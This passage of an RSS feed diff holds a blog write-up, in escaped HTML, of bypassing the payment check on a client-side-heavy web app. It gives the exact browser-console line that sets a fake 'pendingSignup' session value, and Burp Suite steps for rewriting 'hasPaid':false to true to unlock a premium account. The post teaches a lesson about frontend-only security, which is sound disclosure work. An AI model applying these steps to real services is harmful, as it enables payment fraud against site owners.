+&lt;h3 id=&#34;step-1-crafting-a-paid-account&#34;&gt;Step 1: Crafting a &amp;ldquo;Paid&amp;rdquo; Account&lt;/h3&gt;
+&lt;p&gt;I grabbed a temporary email from a disposable mail service because, let&amp;rsquo;s be real, you never use your real email when money is (supposedly) involved.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s say I got &lt;code&gt;c016u@mechanicspedia.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then, I opened the browser console on the site&amp;rsquo;s homepage and typed this magic spell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setItem&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pendingSignup&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c016u@mechanicspedia.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PasswordGoesHere123&amp;#39;&lt;/span&gt;}));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the &lt;code&gt;pendingSignup&lt;/code&gt; value manually set, all I had to do was navigate directly to the &lt;code&gt;/payment-success&lt;/code&gt; endpoint. As the source code promised, it saw the session data, assumed I was a good, paying customer, and signed me right up.&lt;/p&gt;
+&lt;p&gt;It worked.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;cover.png&#34; alt=&#34;Payment successful&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A verification email landed in my temporary inbox. Clicking the link redirected me to the homepage for a &amp;ldquo;paid&amp;rdquo; user. Jackpot, right?&lt;/p&gt;
+&lt;p&gt;Not quite. Remember that &lt;code&gt;checkPaymentStatus()&lt;/code&gt; function? It left us alone during signup, but now it&amp;rsquo;s back for revenge. The site sees we&amp;rsquo;re logged in and calls this function to confirm we&amp;rsquo;ve actually paid. The function, doing its one job correctly, always responds with &lt;code&gt;{ &amp;quot;hasPaid&amp;quot;: false }&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;step-2-making-the-client-lie&#34;&gt;Step 2: Making the Client Lie&lt;/h3&gt;
+&lt;p&gt;Now, we know most of the logic is handled on the client side (Vibe Coding™). My hypothesis was simple: if I could just make that &lt;code&gt;hasPaid&lt;/code&gt; response come back as &lt;code&gt;true&lt;/code&gt;, I could bypass the authorization check and enjoy my free premium account.&lt;/p&gt;
+&lt;p&gt;So, I fired up Burp Suite.&lt;/p&gt;
+&lt;p&gt;I added the target site to my scope and went to &lt;strong&gt;Proxy -&amp;gt; Options -&amp;gt; Intercept Server Responses&lt;/strong&gt; and enabled it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;response.png&#34; alt=&#34;Response intercept&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With the intercept active, I reloaded the page and caught the response from the server. In the response body was the simple JSON payload: &lt;code&gt;{ &amp;quot;hasPaid&amp;quot;: false }&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Time to lie. I went to &lt;strong&gt;Proxy -&amp;gt; Options -&amp;gt; Match and Replace&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;matchImg.png&#34; alt=&#34;Match and Replace Burp&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I added a simple rule to replace the string &lt;code&gt;&amp;quot;hasPaid&amp;quot;:false&lt;/code&gt; with &lt;code&gt;&amp;quot;hasPaid&amp;quot;:true&lt;/code&gt; in all responses.&lt;/p&gt;
+&lt;p&gt;And voilà! The error messages vanished. We successfully bypassed the payment and authorization checks, unlocking a full premium account.&lt;/p&gt;
+&lt;h3 id=&#34;the-aftermath&#34;&gt;The Aftermath&lt;/h3&gt;
+&lt;p&gt;I did reach out to the creator by email a few weeks ago but never received a response. As of now, the site is still running, but it seems their Supabase API key has expired, so the application is mostly non-functional.&lt;/p&gt;
+&lt;p&gt;This was a fun little exercise that teaches a classic lesson: relying too heavily on the frontend for security is a terrible idea. But relying on &amp;ldquo;Vibe Coding&amp;rdquo; without understanding secure practices is an even worse one.&lt;/p&gt;
+&lt;p&gt;So, an additional tip for bug bounties: keep an eye out for the &amp;ldquo;vibe coders.&amp;rdquo; In this day and age, they are often the lowest-hanging fruit.&lt;/p&gt;
+</content>
     </item>
+    
   </channel>
 </rss>
